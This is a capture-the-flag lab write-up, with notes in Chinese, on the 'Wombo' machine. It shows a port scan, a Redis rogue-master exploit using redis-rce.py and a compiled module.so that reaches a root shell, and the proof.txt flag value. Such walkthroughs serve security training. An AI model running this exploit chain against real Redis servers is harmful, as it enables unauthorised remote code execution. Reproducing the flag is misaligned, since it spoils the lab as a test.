###### tags: `Offsec` `PG Practice` `Easy` `Linux`

# Wombo
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.237.69 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.237.69:22
Open 192.168.237.69:80
Open 192.168.237.69:6379
Open 192.168.237.69:8080
Open 192.168.237.69:27017

PORT      STATE SERVICE    REASON  VERSION
22/tcp    open  ssh        syn-ack OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
80/tcp    open  http       syn-ack nginx 1.10.3
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.3
| http-methods: 
|_  Supported Methods: GET HEAD
6379/tcp  open  redis      syn-ack Redis key-value store 5.0.9
8080/tcp  open  http-proxy syn-ack
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| http-robots.txt: 3 disallowed entries 
|_/admin/ /reset/ /compose
|_http-title: Home | NodeBB
27017/tcp open  mongodb    syn-ack MongoDB
| mongodb-info: 
|   MongoDB Build info
|     storageEngines
|       3 = wiredTiger
|       0 = devnull
|       1 = ephemeralForTest
|       2 = mmapv1
|     modules
|     allocator = tcmalloc
|     bits = 64
|     openssl
|       running = OpenSSL 1.1.0l  10 Sep 2019
|       compiled = OpenSSL 1.1.0l  10 Sep 2019
|     versionArray
|       3 = 0
|       0 = 4
|       1 = 0
|       2 = 18
|     sysInfo = deprecated
|     buildEnvironment
|       cc = /opt/mongodbtoolchain/v2/bin/gcc: gcc (GCC) 5.4.0
|       ccflags = -fno-omit-frame-pointer -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -Werror -O2 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-but-set-variable -Wno-missing-braces -fstack-protector-strong -fno-builtin-memcmp
|       cxxflags = -Woverloaded-virtual -Wno-maybe-uninitialized -std=c++14
|       distarch = x86_64
|       target_os = linux
|       cxx = /opt/mongodbtoolchain/v2/bin/g++: g++ (GCC) 5.4.0
|       linkflags = -pthread -Wl,-z,now -rdynamic -Wl,--fatal-warnings -fstack-protector-strong -fuse-ld=gold -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -Wl,--warn-execstack -Wl,-z,relro
|       distmod = debian92
|       target_arch = x86_64
|     gitVersion = 6883bdfb8b8cff32176b1fd176df04da9165fd67
|     version = 4.0.18
|     maxBsonObjectSize = 16777216
|     debug = false
|     ok = 1.0
|     javascriptEngine = mozjs
|   Server status
|     code = 13
|     errmsg = command serverStatus requires authentication
|     ok = 0.0
|_    codeName = Unauthorized
| mongodb-databases: 
|   code = 13
|   errmsg = command listDatabases requires authentication
|   ok = 0.0
|_  codeName = Unauthorized
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 200 OK
|     Connection: close
|     Content-Type: text/plain
|     Content-Length: 85
|     looks like you are trying to access MongoDB over HTTP on the native driver port.
|   mongodb: 
|     errmsg
|     command serverStatus requires authentication
|     code
|     codeName
|_    Unauthorized
```

需用組合技[Redis RCE](https://github.com/Ridter/redis-rce)與[RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)，先針對`RedisModules-ExecuteCommand`裡面進行make，處理好把`module.so`複製到`redis-RCE`
```
┌──(kali㉿kali)-[~/pgplay/RedisModules-ExecuteCommand]
└─$ make
```

選擇`[i]nteractive shell`，發現登入後就是`root`，在/root路徑找到proof.txt
```
┌──(kali㉿kali)-[~/pgplay/redis-rce]
└─$ python3 redis-rce.py -f module.so -r 192.168.237.69 -p 6379 -L 192.168.45.209 -P 6379

[*] Connecting to  192.168.237.69:6379...
[*] Sending SLAVEOF command to server
[+] Accepted connection from 192.168.237.69:6379
[*] Setting filename
[+] Accepted connection from 192.168.237.69:6379
[*] Start listening on 192.168.45.209:6379
[*] Tring to run payload
[+] Accepted connection from 192.168.237.69:43355
[*] Closing rogue server...

[+] What do u want ? [i]nteractive shell or [r]everse shell or [e]xit: i

$ whoami
root
$ cat /root/proof.txt
6d8489cc57c8f2294a6eceb89080b675
```